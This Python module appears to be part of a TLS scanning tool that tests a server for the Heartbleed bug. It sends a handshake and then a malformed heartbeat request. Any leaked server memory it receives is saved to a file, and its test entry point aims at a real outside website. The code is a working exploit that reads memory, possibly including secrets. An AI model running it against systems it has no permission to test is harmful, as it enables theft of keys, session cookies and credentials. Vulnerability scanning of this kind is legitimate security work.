__author__ = 'Den'

import socket
import os
import binascii
import time
import select
import struct
import urllib.parse
from sslscan import status

#binary string from hex string
def hex2bin(x):
    return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))

#packet with hello message we want to send
helloPacket = hex2bin(
'16 03 02 00 31'    # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
'01 00 00 2d'       # Message type = 01 (client hello); Length = 00 00 2d

'03 02'             # Client version = 03 02 (TLS 1.1)

# Random (uint32 time followed by 28 random bytes):
'50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
'00'                # Session id = 00
'00 04 '            # Cipher suite length
'00 33 c0 11'       # 4 cipher suites
'01'                # Compression methods length
'00'                # Compression method 0: no compression = 0
'00 00'             # Extensions length = 0
)

heartbleedPacket = hex2bin(
'18 03 02 00 03'    # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
'01 FF FF'          # Heartbeat message type = 01 (request); Payload length = FF FF
                    # Missing a message that is supposed to be FF FF bytes long
)

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        # Wait until the socket is ready to be read
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def getTLSMessage(s, fragments=1):
    contentType = None
    version = None
    length = None
    payload = b''

    # The server may send less fragments. Because of that, this will return partial data.
    for fragmentIndex in range(0, fragments):
        tlsHeader = recvall(s, 5) # Receive 5 byte header (Content type, version, and length)

        if tlsHeader is None:
            print('Unexpected EOF receiving record header - server closed connection')
            return contentType, version, payload # Return what we currently have

        contentType, version, length = struct.unpack('>BHH', tlsHeader) # Unpack the header
        payload_tmp = recvall(s, length, 5) # Receive the data that the server told us it'd send

        if payload_tmp is None:
            print('Unexpected EOF receiving record payload - server closed connection')
            return contentType, version, payload # Return what we currently have

        print('Received message: type = %d, ver = %04x, length = %d' % (contentType, version, len(payload_tmp)))

        payload = payload + payload_tmp

    return contentType, version, payload

def dump(s):
    filename = "hb_dump.txt"
    dump = open(filename,'wb')
    dump.write(s)
    dump.close()
    print("Saved into "+os.path.abspath(filename))

def exploit(s):
    s.send(heartbleedPacket)

    # We asked for 64 kB, so we should get 4 packets
    contentType, version, payload = getTLSMessage(s, 4)
    if contentType is None:
        print('No heartbeat response received, server likely not vulnerable')
        return False

    if contentType == 24:
        print('Received heartbeat response:')
        dump(payload)
        if len(payload) > 3:
            print('WARNING: server returned more data than it should - server is vulnerable!')
        else:
            print('Server processed malformed heartbeat, but did not return any extra data.')
        return True

    if contentType == 21:
        print('Received alert:')
        dump(payload)
        print('Server returned error, likely not vulnerable')
        return False

def check(host, port=443):

    print("Start scan: {0} at port {1}".format(host, port))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('Connecting...')
    try:
        s.connect((host, port))
    except:
        print("Failed to connect")
        return status.Status.stError

    print('Sending Client Hello...')
    s.send(helloPacket)

    print('Waiting for Server Hello...')

    # Receive packets until we get a hello done packet
    while True:
        contentType, version, payload = getTLSMessage(s)
        if contentType == None:
            print('Server closed connection without sending Server Hello.')
            return status.Status.stError
        # Look for server hello done message.
        if contentType == 22 and payload[0] == 0x0E:
            break

    print('Sending heartbeat request...')
    if exploit(s)==False:
        return status.Status.stOk
    return status.Status.stVuln

def main(): #for test
    url = "https://fitnessland.spb.ru"
    host = urllib.parse.urlparse(url).netloc
    check(host)

if __name__ == '__main__':
    main()